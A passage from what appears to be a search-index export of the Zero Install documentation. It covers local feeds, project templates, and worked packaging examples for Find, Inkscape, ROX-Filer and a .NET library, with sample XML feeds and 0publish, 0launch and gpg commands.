specified like this: This ensures that .../ROX-Lib2/python is in PYTHONPATH . When 0publish-gui does import rox , the import thus uses the directory .../ROX-Lib2/python/rox . When you want to add more versions, you should use the Add Group button to create a group. Make sure both versions are inside the new group (use drag-and-drop to move them). Then you only need to set the license, main, OS and CPU settings in one place. You can also share dependencies using groups.","title":"Groups and dependencies"},{"location":"packaging/guide-gui/#trouble-shooting","text":"I can't find a generic binary for the program I want to package! Popular projects usually provide a \"generic\" binary tarball, which works on most Linux distributions. This is the best archive to put in the feed. If there isn't one, it might mean that the developers couldn't get a single binary to work on multiple distributions, or it might just mean they haven't tried. Often, a Red Hat RPM will work just fine on Debian (e.g. the LyX feed ), or a .deb will work on Red Hat, etc. If there are several options, pick the one for the distribution which is furthest behind (e.g. Red Hat rather than Fedora). Packages for old systems often still work with newer ones, but not the other way around. My program assumes it's running from /usr/games Games have an annoying habit of trying to cd to a hard-coded directory in their start-up script. You could try asking the author to fix it ( cd \"$(dirname $0)\" would work just as well). It's also possible to patch the download using a <recipe> element, but the GUI doesn't provide an interface for this. The trick here is getting the ID right; you need the digest of the directory structure after the patch has been applied. 0store manifest can help here.","title":"Trouble-shooting"},{"location":"packaging/guide-gui/#further-reading","text":"Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. 0publish A command reference for the 0publish command. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically.","title":"Further reading"},{"location":"packaging/local-feeds/","text":"Local feeds Normally, 0install downloads a feed from the web, selects a version, downloads the archive for that version, and runs it. However, 0install can also be used locally (e.g. to run a program you are currently writing, which hasn't been released yet). There are several reasons why you might want to do this: 0install can select and download your program's build or runtime dependencies. It provides a cross-platform way to set environment variables and start your program. You can use 0release to generate releases automatically. A simple example Let's say you have a simple Python 2 program, hello.py : print \"Hello World!\" You could make this runnable by specifying a shebang line . But that wouldn't work on Windows (which doesn't support them). Also, different versions of Linux need different lines (e.g. #!/usr/bin/python on Debian, but #!/usr/bin/python2 on Arch). Instead, we can create a local feed to say how to run it. Create hello.xml in the same directory: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Hello</name> <summary>minimal demonstration program</summary> <implementation id=\".\" version=\"0.1-pre\"> <command name='run' path='hello.py'> <runner interface='http://repo.roscidus.com/python/python'> <version before='3'/> </runner> </command> </implementation> </interface> Setting id=\".\" says that the implementation of this interface is the directory containing the feed (whereas normally we'd specify a digest and a URL from which to download the archive). There are two other differences to note: there is no digital signature at the end (we assume that no attacker could intercept the file between your harddisk and you ;-), and the version number ends in a modifier ( -pre in this case), showing that it hasn't been released. You can now use this feed with the usual 0install commands. For example: $ 0launch hello.xml Hello World! $ 0install add hello-dev hello.xml $ hello-dev Hello World! $ 0install select hello.xml \\- URI: /home/bob/hello/hello.xml Version: 0.1-pre Path: /home/bob/hello \\- URI: http://repo.roscidus.com/python/python Version: 2.7.3 Path: (package:deb:python2.7:2.7.3:x86_64) This will work on Linux, MacOS X, Windows, etc. Next steps Some more things you can do with your new local feed: Depend on other libraries or tools (see the feed specification for reference). Compile source code using 0compile . Make a release using 0release . Test against different versions of dependencies using 0test . See the example templates for projects in different languages and using various build systems.","title":"Local feeds"},{"location":"packaging/local-feeds/#local-feeds","text":"Normally, 0install downloads a feed from the web, selects a version, downloads the archive for that version, and runs it. However, 0install can also be used locally (e.g. to run a program you are currently writing, which hasn't been released yet). There are several reasons why you might want to do this: 0install can select and download your program's build or runtime dependencies. It provides a cross-platform way to set environment variables and start your program. You can use 0release to generate releases automatically.","title":"Local feeds"},{"location":"packaging/local-feeds/#a-simple-example","text":"Let's say you have a simple Python 2 program, hello.py : print \"Hello World!\" You could make this runnable by specifying a shebang line . But that wouldn't work on Windows (which doesn't support them). Also, different versions of Linux need different lines (e.g. #!/usr/bin/python on Debian, but #!/usr/bin/python2 on Arch). Instead, we can create a local feed to say how to run it. Create hello.xml in the same directory: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Hello</name> <summary>minimal demonstration program</summary> <implementation id=\".\" version=\"0.1-pre\"> <command name='run' path='hello.py'> <runner interface='http://repo.roscidus.com/python/python'> <version before='3'/> </runner> </command> </implementation> </interface> Setting id=\".\" says that the implementation of this interface is the directory containing the feed (whereas normally we'd specify a digest and a URL from which to download the archive). There are two other differences to note: there is no digital signature at the end (we assume that no attacker could intercept the file between your harddisk and you ;-), and the version number ends in a modifier ( -pre in this case), showing that it hasn't been released. You can now use this feed with the usual 0install commands. For example: $ 0launch hello.xml Hello World! $ 0install add hello-dev hello.xml $ hello-dev Hello World! $ 0install select hello.xml \\- URI: /home/bob/hello/hello.xml Version: 0.1-pre Path: /home/bob/hello \\- URI: http://repo.roscidus.com/python/python Version: 2.7.3 Path: (package:deb:python2.7:2.7.3:x86_64) This will work on Linux, MacOS X, Windows, etc.","title":"A simple example"},{"location":"packaging/local-feeds/#next-steps","text":"Some more things you can do with your new local feed: Depend on other libraries or tools (see the feed specification for reference). Compile source code using 0compile . Make a release using 0release . Test against different versions of dependencies using 0test . See the example templates for projects in different languages and using various build systems.","title":"Next steps"},{"location":"packaging/templates/","text":"This page lists some example code packages which you can use as templates when creating a new program that will be distributed using 0install, or as examples for your own programs. C Java .NET Python C GNU-Hello A sample C program built using autoconf and make. Shows how to make a source package that can be used by 0compile to create a binary release. See 0release: binaries for details. hello-scons Another C program, but this time using SCons instead of Make as the build tool. See 0compile: Scons for details. hello-c-cmake A C program built using CMake. Java hello-java A Java program, built using SCons. Gets SCons, the Java JDK and the Java JRE through 0install. Maven integration with pom2feed Build your project with Maven, creating a 0install feed for it automatically. .NET Packaging .NET libraries This tutorial explains how to create feeds for a .NET application with a dependency on a .NET library using the Publishing Tools. Python hello-python A simple Python program. Depends on Python 2.x using 0install. See the 0release tutorial for more information.","title":"Templates"},{"location":"packaging/templates/#c","text":"GNU-Hello A sample C program built using autoconf and make. Shows how to make a source package that can be used by 0compile to create a binary release. See 0release: binaries for details. hello-scons Another C program, but this time using SCons instead of Make as the build tool. See 0compile: Scons for details. hello-c-cmake A C program built using CMake.","title":"C"},{"location":"packaging/templates/#java","text":"hello-java A Java program, built using SCons. Gets SCons, the Java JDK and the Java JRE through 0install. Maven integration with pom2feed Build your project with Maven, creating a 0install feed for it automatically.","title":"Java"},{"location":"packaging/templates/#net","text":"Packaging .NET libraries This tutorial explains how to create feeds for a .NET application with a dependency on a .NET library using the Publishing Tools.","title":".NET"},{"location":"packaging/templates/#python","text":"hello-python A simple Python program. Depends on Python 2.x using 0install. See the 0release tutorial for more information.","title":"Python"},{"location":"packaging/examples/dotnet-lib/","text":"This tutorial explains how to create feeds for a .NET application with a dependency on a .NET library using the Zero Install Publishing Tools . The application (EXE) When using the \"New Feed Wizard\" for creating the feed for the EXE make sure to set \"External dependencies\" to True on the \"Fill in missing details\" page. This will automatically add the following line to your feed: <runner interface=\"http://0install.de/feeds/cli/cli-monopath.xml\" command=\"run-gui\"/> This enables Zero Install to inject DLLs provided by feeds into .NET applications. This is required because, unlike regular DLLs, .NET DLLs are not located via the PATH environment variable. You can then add a dependency on your library feed by adding something like this inside the <implementation> tag: <requires interface=\"http://somedomain.com/somelibrary.xml\"> <environment insert=\".\" mode=\"append\" name=\"MONO_PATH\"/> </requires> Note that MONO_PATH does not mean that this requires Mono. It just shares the same environment variable name for uniformity. The library (DLL) To create a feed for the library start by selecting \"New Empty Feed\" and copying this into the XML view of the editor: <interface uri=\"http://somedomain.com/somelibrary.xml\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Some library</name> <summary>a library for something</summary> <implementation version=\"1.0\"> <archive href=\"http://somedomain.com/somelibrary.zip\"/> </implementation> </interface> You can then fill in the placeholder names and URLs. Once you are done, select the archive node in the tree-view and click on the \"Add missing\" button on the right hand-side. This performs the same archive download, extraction and hashing that the \"New Feed Wizard\" normally would.","title":".NET library"},{"location":"packaging/examples/dotnet-lib/#the-application-exe","text":"When using the \"New Feed Wizard\" for creating the feed for the EXE make sure to set \"External dependencies\" to True on the \"Fill in missing details\" page. This will automatically add the following line to your feed: <runner interface=\"http://0install.de/feeds/cli/cli-monopath.xml\" command=\"run-gui\"/> This enables Zero Install to inject DLLs provided by feeds into .NET applications. This is required because, unlike regular DLLs, .NET DLLs are not located via the PATH environment variable. You can then add a dependency on your library feed by adding something like this inside the <implementation> tag: <requires interface=\"http://somedomain.com/somelibrary.xml\"> <environment insert=\".\" mode=\"append\" name=\"MONO_PATH\"/> </requires> Note that MONO_PATH does not mean that this requires Mono. It just shares the same environment variable name for uniformity.","title":"The application (EXE)"},{"location":"packaging/examples/dotnet-lib/#the-library-dll","text":"To create a feed for the library start by selecting \"New Empty Feed\" and copying this into the XML view of the editor: <interface uri=\"http://somedomain.com/somelibrary.xml\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Some library</name> <summary>a library for something</summary> <implementation version=\"1.0\"> <archive href=\"http://somedomain.com/somelibrary.zip\"/> </implementation> </interface> You can then fill in the placeholder names and URLs. Once you are done, select the archive node in the tree-view and click on the \"Add missing\" button on the right hand-side. This performs the same archive download, extraction and hashing that the \"New Feed Wizard\" normally would.","title":"The library (DLL)"},{"location":"packaging/examples/find/","text":"In the main packaging guide (which should be read before this one) we saw how to make a simple Python program available. When the user asked to run the program, the injector downloaded it for them and cached it. However, most programs depend on other programs, libraries and resources and these can also be fetched using the injector. Our example package will be Find , a little utility for searching for files which depends on the ROX-Lib Python library. Running Find directly Creating the interface file Adding the archive Note on weaknesses in SHA-1 Publishing the interface Registering the local feed Problems with manifest digests Running Find directly Start by downloading Find-006 . This is just a normal application, not specially designed for the injector. If you try to run it, you should get an error: $ wget http://www.hayber.us/rox/find/Find-006.tgz $ tar xzf Find-006.tgz $ cd Find $ ./AppRun *** This program needs ROX-Lib2 (version 2.0.0) to run. Note: If it runs without an error, then either you've installed ROX-Lib manually (not using the injector) or your PYTHONPATH already points to it. Creating the interface file Start by creating an XML interface file ( Find.xml ) as we did before: $ 0publish Find.xml Fill in the fields as before. The only difference is the addition of the requires element, which states that this program requires ROX-Lib , and the main attribute which is now AppRun . The final result should look something like this: <?xml version=\"1.0\" ?> <?xml-stylesheet type='text/xsl' href='http://0install.net/2006/stylesheets/interface.xsl'?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Find</name> <summary>a find-in-files utility</summary> <description> Searches files for specific text, displaying the results in a window. Double click on the result line(s) to open the file at that point. Configuration options are available to customize the search command and the editor with which to open the files. </description> <homepage>http://www.hayber.us/rox/Find</homepage> <icon type='image/png' href='http://www.hayber.us/0install/Find.png'/> <group main='AppRun'> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> <implementation id='.' version='6'/> </group> Let's go over the group part in detail: The <group> element contains a set of implementations of the interface (versions of Find ) and their requirements. The group saves us having to repeat the requirements for each implementation (since they often don't change). We have also given the main attribute here, since all versions of Find are run using a script with this name. We have a single requirement, ROX-Lib, which is identified by the URI of its interface. The URI is chosen by the publisher of the ROX-Lib interface, just as we chose the URI for our SCons interface in the previous tutorial. The <environment> element inside tells the injector how to make its choice known to Find . In this case, it is by inserting /path/of/cache/DIGEST/ROX-Lib2/python to the beginning of the PYTHONPATH environment variable. When Find (a Python program) does import rox , it will then get the chosen version of ROX-Lib . Also inside the group we have a single (local) implementation, as before. The id gives the location of the implementation directory relative to the interface file. In this case, we are assuming that the Find.xml file is in the same directory as the AppRun script. Save the interface using the default file name (a temporary file chosen by 0publish ) and try running it: $ 0launch ./Find.xml If you don't already have ROX-Lib, you will be prompted to download it as usual. Once ROX-Lib is available, Find runs: As usual, you can run 0launch -g ./Find.xml to force the 0launch GUI to appear. You will see that there is a single version of Find available, but that you can choose any version of ROX-Lib to use with it. Adding the archive We will now change the implementation as we did before so that the injector will download Find for us instead of requiring it to be on the machine already: $ 0publish Find.xml \\ --set-version=6 \\ --set-released=today \\ --archive-url=http://www.hayber.us/rox/find/Find-006.tgz \\ --archive-file=../Find-006.tgz \\ --archive-extract=Find As the archive file isn't in the current directory, we give its location with --archive-file . 0publish needs this to get the digest, but it doesn't download the archive from the network because it wouldn't be able to check that it hasn't been tampered with (although if the program's author doesn't provide a signature then there may be no way to check anyway). We also use the --archive-extract attribute. This is because each Find archive contains a single top-level directory, which we don't need (and the name might change in different versions, e.g. if the author decides to include the version number). Extracting just the contents means the every version will have the same structure, which makes it easier for other programs to depend on it. This is mostly useful for libraries like ROX-Lib, where we need to know that the path will always be lib , not libfoo-1.1/lib with version 1.1 and libfoo-1.2/lib with version 1.2, since a fixed path has to go in the environment element above. The resulting file will contain this: <implementation id='sha1=ff9d9e11fde0a146c7e1781511fd9afb17752e34' released=\"2006-05-19\" version='6'> <archive href=\"http://www.hayber.us/rox/find/Find-006.tgz\" size=\"23161\" extract='Find'/> </implementation> The attributes of <archive> are: href a URL from which the archive can be downloaded (in escaped form, so a space is written as %20, etc). size the size of the archive (for progress bars). extract (optional) a subdirectory of the archive to use. We could have omitted this and changed the implementation's main to Find/AppRun instead, but it's better to keep the main attribute the same, if possible. If you run the new Find.xml , the injector should download and unpack the archive into the cache, and run Find from it. Note on weaknesses in SHA-1 Some weaknesses in the SHA-1 algorithm have been discovered. At present, it is still strong enough for our use, but you may wish to use some other algorithm, with the --manifest-algorithm option. See the specification for a list of available secure hashing algorithms and which versions of the injector support them. See the HASH COLLISION Q&A for more details. Publishing the interface The Find.xml interface file can now be signed and published as described before: $ 0publish Find.xml --set-interface-uri=http://www.hayber.us/0install/Find $ 0publish Find.xml --xmlsign Registering the local feed We have already seen how to use a local Find.xml file inside the Find directory to run the local version with a chosen version of ROX-Lib (i.e., by setting the id attribute to . ). It is quite useful to add this file to your CVS (or similar system) to let developers test new versions easily, since it will get the libraries for them. In fact, we'd often like to see both downloadable implementations (e.g., official releases) and local versions (e.g., developer CVS checkouts) of Find together. To do this, all we need is to add a feed-for line in the local Find/Find.xml file (the one where the implementation id is . ): <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <feed-for interface='http://www.hayber.us/0install/Find'/> You can now register the local feed in the normal way: $ 0launch --feed Find.xml When another program runs Find using its official URI, this local version will be included in the list of available versions that can be selected. It is traditional to add .0 to the end of the version number for CVS versions, so that the CVS version will be preferred to the previous release. Problems with manifest digests There is one possible problem with the digests, where the 'actual' manifest changes each time the archive is extracted! This happens when you include only some deep subdirectories in the archive, but not the top-level directory. Eg: $ tar czf archive.tgz deeply/nested/path When tar extracts the archive, it restores the original mtime of 'path', but creates 'deeply' and 'nested' with the current time. This is what causes the digest to change. There are two possible solutions: Always list all top-level directories when creating archives. Use any algorithm except sha1 , as this is the only one that includes directory mtimes in the digest (for backwards compatibility).","title":"Find"},{"location":"packaging/examples/find/#running-find-directly","text":"Start by downloading Find-006 . This is just a normal application, not specially designed for the injector. If you try to run it, you should get an error: $ wget http://www.hayber.us/rox/find/Find-006.tgz $ tar xzf Find-006.tgz $ cd Find $ ./AppRun *** This program needs ROX-Lib2 (version 2.0.0) to run. Note: If it runs without an error, then either you've installed ROX-Lib manually (not using the injector) or your PYTHONPATH already points to it.","title":"Running Find directly"},{"location":"packaging/examples/find/#creating-the-interface-file","text":"Start by creating an XML interface file ( Find.xml ) as we did before: $ 0publish Find.xml Fill in the fields as before. The only difference is the addition of the requires element, which states that this program requires ROX-Lib , and the main attribute which is now AppRun . The final result should look something like this: <?xml version=\"1.0\" ?> <?xml-stylesheet type='text/xsl' href='http://0install.net/2006/stylesheets/interface.xsl'?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>Find</name> <summary>a find-in-files utility</summary> <description> Searches files for specific text, displaying the results in a window. Double click on the result line(s) to open the file at that point. Configuration options are available to customize the search command and the editor with which to open the files. </description> <homepage>http://www.hayber.us/rox/Find</homepage> <icon type='image/png' href='http://www.hayber.us/0install/Find.png'/> <group main='AppRun'> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> <implementation id='.' version='6'/> </group> Let's go over the group part in detail: The <group> element contains a set of implementations of the interface (versions of Find ) and their requirements. The group saves us having to repeat the requirements for each implementation (since they often don't change). We have also given the main attribute here, since all versions of Find are run using a script with this name. We have a single requirement, ROX-Lib, which is identified by the URI of its interface. The URI is chosen by the publisher of the ROX-Lib interface, just as we chose the URI for our SCons interface in the previous tutorial. The <environment> element inside tells the injector how to make its choice known to Find . In this case, it is by inserting /path/of/cache/DIGEST/ROX-Lib2/python to the beginning of the PYTHONPATH environment variable. When Find (a Python program) does import rox , it will then get the chosen version of ROX-Lib . Also inside the group we have a single (local) implementation, as before. The id gives the location of the implementation directory relative to the interface file. In this case, we are assuming that the Find.xml file is in the same directory as the AppRun script. Save the interface using the default file name (a temporary file chosen by 0publish ) and try running it: $ 0launch ./Find.xml If you don't already have ROX-Lib, you will be prompted to download it as usual. Once ROX-Lib is available, Find runs: As usual, you can run 0launch -g ./Find.xml to force the 0launch GUI to appear. You will see that there is a single version of Find available, but that you can choose any version of ROX-Lib to use with it.","title":"Creating the interface file"},{"location":"packaging/examples/find/#adding-the-archive","text":"We will now change the implementation as we did before so that the injector will download Find for us instead of requiring it to be on the machine already: $ 0publish Find.xml \\ --set-version=6 \\ --set-released=today \\ --archive-url=http://www.hayber.us/rox/find/Find-006.tgz \\ --archive-file=../Find-006.tgz \\ --archive-extract=Find As the archive file isn't in the current directory, we give its location with --archive-file . 0publish needs this to get the digest, but it doesn't download the archive from the network because it wouldn't be able to check that it hasn't been tampered with (although if the program's author doesn't provide a signature then there may be no way to check anyway). We also use the --archive-extract attribute. This is because each Find archive contains a single top-level directory, which we don't need (and the name might change in different versions, e.g. if the author decides to include the version number). Extracting just the contents means the every version will have the same structure, which makes it easier for other programs to depend on it. This is mostly useful for libraries like ROX-Lib, where we need to know that the path will always be lib , not libfoo-1.1/lib with version 1.1 and libfoo-1.2/lib with version 1.2, since a fixed path has to go in the environment element above. The resulting file will contain this: <implementation id='sha1=ff9d9e11fde0a146c7e1781511fd9afb17752e34' released=\"2006-05-19\" version='6'> <archive href=\"http://www.hayber.us/rox/find/Find-006.tgz\" size=\"23161\" extract='Find'/> </implementation> The attributes of <archive> are: href a URL from which the archive can be downloaded (in escaped form, so a space is written as %20, etc). size the size of the archive (for progress bars). extract (optional) a subdirectory of the archive to use. We could have omitted this and changed the implementation's main to Find/AppRun instead, but it's better to keep the main attribute the same, if possible. If you run the new Find.xml , the injector should download and unpack the archive into the cache, and run Find from it.","title":"Adding the archive"},{"location":"packaging/examples/find/#note-on-weaknesses-in-sha-1","text":"Some weaknesses in the SHA-1 algorithm have been discovered. At present, it is still strong enough for our use, but you may wish to use some other algorithm, with the --manifest-algorithm option. See the specification for a list of available secure hashing algorithms and which versions of the injector support them. See the HASH COLLISION Q&A for more details.","title":"Note on weaknesses in SHA-1"},{"location":"packaging/examples/find/#publishing-the-interface","text":"The Find.xml interface file can now be signed and published as described before: $ 0publish Find.xml --set-interface-uri=http://www.hayber.us/0install/Find $ 0publish Find.xml --xmlsign","title":"Publishing the interface"},{"location":"packaging/examples/find/#registering-the-local-feed","text":"We have already seen how to use a local Find.xml file inside the Find directory to run the local version with a chosen version of ROX-Lib (i.e., by setting the id attribute to . ). It is quite useful to add this file to your CVS (or similar system) to let developers test new versions easily, since it will get the libraries for them. In fact, we'd often like to see both downloadable implementations (e.g., official releases) and local versions (e.g., developer CVS checkouts) of Find together. To do this, all we need is to add a feed-for line in the local Find/Find.xml file (the one where the implementation id is . ): <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <feed-for interface='http://www.hayber.us/0install/Find'/> You can now register the local feed in the normal way: $ 0launch --feed Find.xml When another program runs Find using its official URI, this local version will be included in the list of available versions that can be selected. It is traditional to add .0 to the end of the version number for CVS versions, so that the CVS version will be preferred to the previous release.","title":"Registering the local feed"},{"location":"packaging/examples/find/#problems-with-manifest-digests","text":"There is one possible problem with the digests, where the 'actual' manifest changes each time the archive is extracted! This happens when you include only some deep subdirectories in the archive, but not the top-level directory. Eg: $ tar czf archive.tgz deeply/nested/path When tar extracts the archive, it restores the original mtime of 'path', but creates 'deeply' and 'nested' with the current time. This is what causes the digest to change. There are two possible solutions: Always list all top-level directories when creating archives. Use any algorithm except sha1 , as this is the only one that includes directory mtimes in the digest (for backwards compatibility).","title":"Problems with manifest digests"},{"location":"packaging/examples/inkscape/","text":"The Inkscape project makes available a binary RPM which works on various platforms. However, using this RPM directly has a few limitations for users: They must be root to install it. It doesn't work on all distributions (e.g., Debian). The system won't periodically check for updates. These limitations can be avoided by creating a Zero Install interface file for it. This guide goes over the steps quite quickly. For more details see the packaging main guide . Note: The original Inkscape binary RPM was compiled with binreloc support disabled, which prevented it from finding its icons (it used hard-coded paths). Jean-Fran\u00e7ois Lemaire, the creator of the RPM, has kindly recompiled it for us with relocation support turned on. Creating the interface Testing it Signing and publishing Using the published interface Marking as stable Making a new release Creating the interface We'll be using the 0publish command to create the interface file. If you don't have it already, create an alias for 0publish in the usual way: $ 0install add 0publish http://0install.net/2006/interfaces/0publish To create the interface file: 1. Download the static binary RPM: $ wget http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm 2. Create the interface: $ 0publish Inkscape.xml Fill in the `name`, `summary`, `description`, `icon` and `homepage` fields. Set `main='usr/bin/inkscape'` on the `group` element. Save and quit (using the default filename). 3. Add version 0.43 with the location of the static RPM: $ 0publish Inkscape.xml \\ --set-version=0.43 \\ --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm \\ --set-released=today \\ --set-arch=Linux-i486 Testing it You can run the new XML file with 0launch to download and run Inkscape: $ 0launch ./Inkscape.xml Signing and publishing Now we need to sign the XML file using our GPG key. If you don't already have a GPG key, create one now: $ gpg --gen-key We also need to decide where the Inkscape XML file will be made available. This URL should not change, since other programs will link to it. We'll assume http://inkscape.org/2006/ZeroInstall/Inkscape.xml here. To set the URI and sign the interface: $ 0publish Inkscape.xml \\ --set-interface-uri=http://inkscape.org/2006/ZeroInstall/Inkscape.xml \\ --xmlsign Exported public key as 'AE07828059A53CC1.gpg' Upload the resulting Inkscape.xml and GPG files to the same directory on the web-server. The XML file should look something like the Inkscape.xml test interface . Using the published interface You can now run Inkscape like this: $ 0launch http://inkscape.org/2006/ZeroInstall/Inkscape.xml Users can now install Inkscape using this URL, either using some graphical installer (like ROX's AddApp or Xfce 4.4's panel ). Command-line users can get it like this: $ 0install add inkscape http://inkscape.org/2006/ZeroInstall/Inkscape.xml They can then run it by typing inkscape . To choose a different version: $ 0install update --gui inkscape Marking as stable After the release has been out for a while, mark it as stable: $ 0publish Inkscape.xml --stable Users can configure the injector either to prefer stable versions or to select testing versions by default. This gives your more advanced users the chance to provide feedback before you roll a new release out to all users. Making a new release When a new static binary RPM is released, add the new version to the XML as follows: Download the new RPM (if you're not the person who made it). Add it to the XML (note use of add-version rather than set-version here): $ 0publish Inkscape.xml \\ --add-version=0.44 \\ --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.44-0.i386.rpm \\ --set-released=today \\ --set-arch=Linux-i486","title":"Inkscape"},{"location":"packaging/examples/inkscape/#creating-the-interface","text":"We'll be using the 0publish command to create the interface file. If you don't have it already, create an alias for 0publish in the usual way: $ 0install add 0publish http://0install.net/2006/interfaces/0publish To create the interface file: 1. Download the static binary RPM: $ wget http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm 2. Create the interface: $ 0publish Inkscape.xml Fill in the `name`, `summary`, `description`, `icon` and `homepage` fields. Set `main='usr/bin/inkscape'` on the `group` element. Save and quit (using the default filename). 3. Add version 0.43 with the location of the static RPM: $ 0publish Inkscape.xml \\ --set-version=0.43 \\ --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.43-0.i386.rpm \\ --set-released=today \\ --set-arch=Linux-i486","title":"Creating the interface"},{"location":"packaging/examples/inkscape/#testing-it","text":"You can run the new XML file with 0launch to download and run Inkscape: $ 0launch ./Inkscape.xml","title":"Testing it"},{"location":"packaging/examples/inkscape/#signing-and-publishing","text":"Now we need to sign the XML file using our GPG key. If you don't already have a GPG key, create one now: $ gpg --gen-key We also need to decide where the Inkscape XML file will be made available. This URL should not change, since other programs will link to it. We'll assume http://inkscape.org/2006/ZeroInstall/Inkscape.xml here. To set the URI and sign the interface: $ 0publish Inkscape.xml \\ --set-interface-uri=http://inkscape.org/2006/ZeroInstall/Inkscape.xml \\ --xmlsign Exported public key as 'AE07828059A53CC1.gpg' Upload the resulting Inkscape.xml and GPG files to the same directory on the web-server. The XML file should look something like the Inkscape.xml test interface .","title":"Signing and publishing"},{"location":"packaging/examples/inkscape/#using-the-published-interface","text":"You can now run Inkscape like this: $ 0launch http://inkscape.org/2006/ZeroInstall/Inkscape.xml Users can now install Inkscape using this URL, either using some graphical installer (like ROX's AddApp or Xfce 4.4's panel ). Command-line users can get it like this: $ 0install add inkscape http://inkscape.org/2006/ZeroInstall/Inkscape.xml They can then run it by typing inkscape . To choose a different version: $ 0install update --gui inkscape","title":"Using the published interface"},{"location":"packaging/examples/inkscape/#marking-as-stable","text":"After the release has been out for a while, mark it as stable: $ 0publish Inkscape.xml --stable Users can configure the injector either to prefer stable versions or to select testing versions by default. This gives your more advanced users the chance to provide feedback before you roll a new release out to all users.","title":"Marking as stable"},{"location":"packaging/examples/inkscape/#making-a-new-release","text":"When a new static binary RPM is released, add the new version to the XML as follows: Download the new RPM (if you're not the person who made it). Add it to the XML (note use of add-version rather than set-version here): $ 0publish Inkscape.xml \\ --add-version=0.44 \\ --archive-url=http://users.skynet.be/jflemaire/files/inkscape-0.44-0.i386.rpm \\ --set-released=today \\ --set-arch=Linux-i486","title":"Making a new release"},{"location":"packaging/examples/rox/","text":"This guide shows some more advanced features of Zero Install: Creating platform-specific binaries (ROX-Filer is written in C). Local interfaces in source releases. Adding extra feeds (the maintainer of the PPC and ix86 interfaces are different people, but users get the right binary automatically). This guide assumes you've already read the packaging guide , which explains how to create and publish interface files. We won't explain all the concepts in detail again, we'll just show how to script the steps. General operation Creating a binary of ROX-Filer Adding the archive to the interface Publishing the interface with Zero Install General operation 0publish edits interface files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. You can create an alias for 0publish in the usual way, to save typing: $ 0install add 0publish http://0install.net/2006/interfaces/0publish Creating a binary of ROX-Filer For this example we'll compile a binary of ROX-Filer for our platform (we'll assume there isn't one already) and make a feed for other people with the same platform (I'll use ppc64 for the examples). Start by creating an archive as normal: 1. Download the ROX-Filer source release (and detached signature): $ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz $ wget http://heanet.dl.sourceforge.net/sourceforge/rox/rox-2.4.1.tgz.sig $ gpg rox-2.4.1.tgz.sig gpg: Signature made Fri 30 Dec 2005 17:32:53 GMT using DSA key ID 59A53CC1 gpg: Good signature from \"Thomas Leonard <...>\" 2. Build as normal: $ tar xzf rox-2.4.1.tgz $ cd rox-2.4.1 $ ./ROX-Filer/AppRun --compile 3. Delete the debugging symbols and the build and src directories to save space: $ rm -r ROX-Filer/{ROX-Filer.dbg,build,src} 4. The ROX-Filer source download includes a local interface file called ROX-Filer.xml . This allows people to register local versions using 0launch --feed . Set the release date and architecture in it: $ 0publish --set-released 2006-02-26 ROX-Filer.xml $ 0publish --set-arch Linux-ppc64 ROX-Filer.xml You can also edit it to change the name and description if you want. The file should now look like this: <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface'> <name>ROX-Filer-ppc64</name> <summary>PPC64 binaries for ROX-Filer</summary> <description> ROX-Filer is a fast and powerful graphical file manager. It has full drag-and-drop support and background file operations, and is highly configurable. It can also act as a pinboard, allowing you to pin frequently used files to the desktop background. </description> <feed-for interface='http://rox.sourceforge.net/2005/interfaces/ROX-Filer'/> <group main='ROX-Filer/AppRun'> <implementation id=\".\" version=\"2.4.1\" released='2006-02-26' arch='Linux-ppc64'/> </group> </interface> 5. Add the architecture to the directory name and tar it all up (we include the architecture in the directory and archive names for clarity only; you can name them whatever you like): $ cd .. $ mv rox{,-linux-ppc64}-2.4.1 $ tar czf rox-linux-ppc64-2.4.1{.tgz,} 6. Upload it somewhere. I'll assume http://example.org/rox-linux-ppc64-2.4.1.tgz in the following examples. Adding the archive to the interface To make our new binary available through Zero Install: 1. Take a copy of the local interface from the archive. We'll use 0publish to change the id from . to the archive's digest and to add an <archive> element: $ cp rox-linux-ppc64-2.4.1/ROX-Filer.xml ROX-Filer-ppc64 $ 0publish ROX-Filer-ppc64 \\ --archive-url http://example.org/rox-linux-ppc64-2.4.1.tgz \\ --archive-file rox-linux-ppc64-2.4.1.tgz \\ --archive-extract rox-linux-ppc64-2.4.1 The local .tgz file is used by 0publish to get the size and manifest digest. The extract value is used as the <archive> 's extract attribute and must match the name of the top-level directory in the archive. If you now view the ROX-Filer-ppc64 file, you should see that 0publish has converted the 